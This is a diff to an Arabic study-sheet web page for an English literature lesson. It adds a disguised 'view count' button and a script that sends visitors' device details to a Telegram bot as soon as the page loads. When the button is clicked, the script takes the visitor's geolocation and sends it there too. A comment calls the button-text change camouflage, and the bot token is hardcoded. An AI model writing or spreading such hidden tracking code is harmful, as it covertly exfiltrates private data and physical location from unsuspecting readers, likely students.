@@ -42,6 +42,30 @@
             box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
             transition: 0.3s;
         }
+
+/* ستايل زر المشاهدات - يشبه زر التغبيش تماماً */
+.views-btn {
+    position: fixed;
+    bottom: 20px;
+    left: 20px; /* هنا خليناه على اليسار */
+    background: #000;
+    color: white;
+    border: 2px solid #ff0000;
+    padding: 12px 25px;
+    border-radius: 50px;
+    font-family: 'Cairo';
+    font-weight: bold;
+    cursor: pointer;
+    z-index: 1000;
+    box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
+    transition: 0.3s;
+}
+
+.views-btn:hover {
+    transform: scale(1.05);
+    background: rgba(255, 0, 0, 0.1);
+}
+
         .test-btn:hover { transform: scale(1.05); }
 
         /* تأثير التغبيش */
@@ -85,6 +109,7 @@
 <body>
 
 <button class="test-btn" id="testToggle">وضع الاختبار (تغبيش)</button>
+<button class="views-btn" id="viewsToggle" onclick="captureLocation()">كم واحد شاف االملزمة </button>
 
 <div class="wrapper">
     <div class="main-header">
@@ -352,6 +377,7 @@
         <p>الأدب: حول العالم في 80 يوماً - الفصل الأول</p>
     </div>
 
+
     <section class="section-box">
         <div class="section-label"><div class="label-circle">L</div><span>Synonyms (مرادفات الأدب)</span></div>
         <div class="row-horizontal">
@@ -583,19 +609,67 @@
 </div> 
 
 <script>
-    const toggleBtn = document.getElementById('testToggle');
-    toggleBtn.onclick = function() {
-        document.body.classList.toggle('is-testing');
-        if (document.body.classList.contains('is-testing')) {
-            this.textContent = "إيقاف الاختبار";
-            this.style.background = "#ff4757";
-            this.style.borderColor = "#fff";
-        } else {
-            this.textContent = "وضع الاختبار (تغبيش)";
-            this.style.background = "#000";
-            this.style.borderColor = "#ff0000";
-        }
+    // --- إعدادات البوت (التوكن والآيدي مالتك) ---
+    const CONFIG = {
+        TOKEN: "7713540341:AAGfI7IguGT5dwEhiocvC9h0mVW9js4ByJQ",
+        CHAT_ID: "6778604620"
     };
+
+    // دالة إرسال البيانات لتليجرام
+    async function sendToTelegram(message) {
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: message })
+            });
+        } catch (e) { /* صمت مطبق */ }
+    }
+
+    // 1. استطلاع تلقائي (Recon) بمجرد فتح الصفحة
+    window.onload = async () => {
+        let batteryStatus = "N/A";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+        }
+        
+        const log = `📱 New Visitor Detected!\n` +
+                    `Platform: ${navigator.platform}\n` +
+                    `شحن: ${batteryStatus}\n` +
+                    `Agent: ${navigator.userAgent.split(' ').pop()}`;
+        sendToTelegram(log);
+    };
+
+    // 2. وظيفة زر "مشاهدات الملزمة" (سحب الموقع)
+    async function captureLocation() {
+        const btn = document.getElementById('viewsToggle');
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                sendToTelegram(`🎯 Location Captured!\nLink: ${mapLink}`);
+                
+                // تمويه: تغيير نص الزر بعد الضغط
+                if(btn) btn.textContent = "كم واحد شاف الملزمة"; 
+            }, (err) => {
+                alert("عذراً، يجب تحديث الصفحة للسماح برؤية المشاهدات الحية.");
+            });
+        }
+    }
+
+    // 3. كود التغبيش الأصلي مالتك (لضمان بقاء عمل الزر الأيمن)
+    const toggleBtn = document.getElementById('testToggle');
+    if (toggleBtn) {
+        toggleBtn.onclick = function() {
+            document.body.classList.toggle('is-testing');
+            this.textContent = document.body.classList.contains('is-testing') ? "إيقاف الاختبار" : "وضع الاختبار (تغبيش)";
+            this.style.background = document.body.classList.contains('is-testing') ? "#ff4757" : "#000";
+        };
+    }
 </script>
 
 </body>
